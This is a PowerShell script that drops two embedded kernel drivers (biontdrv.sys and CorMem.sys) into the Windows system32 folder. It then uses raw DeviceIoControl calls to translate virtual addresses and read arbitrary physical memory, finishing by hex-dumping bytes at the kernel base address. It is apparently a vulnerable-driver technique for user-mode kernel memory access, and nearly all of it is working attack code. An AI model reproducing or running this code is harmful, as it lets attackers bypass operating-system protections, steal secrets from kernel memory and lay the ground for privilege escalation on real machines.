Function Read-PhysicalAddress {
    param (
        [IntPtr]$VA = [IntPtr]::Zero,
        [Int64]$PA = 0L,
        
        [ValidateRange(1, 4096)]
        [Int32]$Size = 4,

        [switch]$AsByte,
        [switch]$AsShort,
        [switch]$AsInt,
        [switch]$AsLong
    )

    if (-not [File]::Exists("C:\windows\system32\biontdrv.sys")) {
        Import-EmbeddedBlock -BlockName biontdrv -OutPath 'C:\windows\system32\biontdrv.sys' | Out-Null
    }

    if ($AsByte)   { $Size = 1 }
    if ($AsShort)  { $Size = 2 }
    if ($AsInt)    { $Size = 4 }
    if ($AsLong)   { $Size = 8 }

    if (-not [File]::Exists("C:\windows\system32\CorMem.sys")) {
        Import-EmbeddedBlock -BlockName CorMem -OutPath 'C:\windows\system32\CorMem.sys' | Out-Null 
    }

    # Translate VA -> PA
    if ($PA -eq 0L) {
        $hCorMem = Get-FileHandle -FileName CorMem
        if ($null -eq $hCorMem -or $hCorMem -eq 0) { return Write-Error "Invalid handle." }
        try {
            $TransInPtr = New-IntPtr -Size 8 -InitialValue $VA -UsePointerSize
            if (-not $NtApi::DeviceIoControl($hCorMem, 2236444, $TransInPtr, 8, $TransInPtr, 8, [IntPtr]::Zero, [IntPtr]::Zero)) { throw "Translation failed." }
            $PA = [Marshal]::ReadInt64($TransInPtr)
        } finally { Free-IntPtr $TransInPtr -Method Auto; if ($hCorMem) { Free-IntPtr $hCorMem -Method NtHandle } }
        if ($PA -eq 0) { return Write-Error "Invalid physical address resolved." }
    }

    $hDevice = Get-FileHandle -FileName 'biontdrv' -Symbolic 'Device'
    if ($null -eq $hDevice -or $hDevice -eq 0) { return Write-Error "Invalid handle." }

    try {
        # 1. Allocate your destination buffer bucket
        $DataPtr = New-IntPtr -Size $Size

        # 2. Build the STRICT 16-byte transaction block
        $TxBlock = New-IntPtr -Size 16
        
        [Marshal]::WriteInt32($TxBlock, 0, [Int32]$PA)
        [Marshal]::WriteInt32($TxBlock, 4, $Size)                                       
        [Marshal]::WriteIntPtr($TxBlock, 8, $DataPtr)                                    

        # 3. Fire IOCTL with input size explicitly set to 16
        if (-not $NtApi::DeviceIoControl(
            $hDevice, 
            0x220014, 
            $TxBlock, 
            16,               
            [IntPtr]::Zero, 
            0, 
            [IntPtr]::Zero, 
            [IntPtr]::Zero
        )) { 
            throw "IOCTL Call failed." 
        }
        
        # 4. Cast output data
        if ($AsByte)  { return [Marshal]::ReadByte($DataPtr) }
        if ($AsShort) { return [Marshal]::ReadInt16($DataPtr) }
        if ($AsInt)   { return [Marshal]::ReadInt32($DataPtr) }
        if ($AsLong)  { return [Marshal]::ReadInt64($DataPtr) }

        # Default fallback
        $OutputByteArray = [byte[]]::new($Size)
        [Marshal]::Copy($DataPtr, $OutputByteArray, 0, $Size)
        return $OutputByteArray
    }
    finally {
        if ($TxBlock)     { New-IntPtr  -Release -hHandle $TxBlock }
        if ($DataPtr)     { New-IntPtr  -Release -hHandle $DataPtr }
        if ($hDevice)     { Free-IntPtr -handle $hDevice -Method NtHandle }
    }
}

Clear-Host
Write-Host

Read-PhysicalAddress -VA (Get-KernelBaseAddress) -Size 96 | Format-HexView -Mode 8x
Write-Host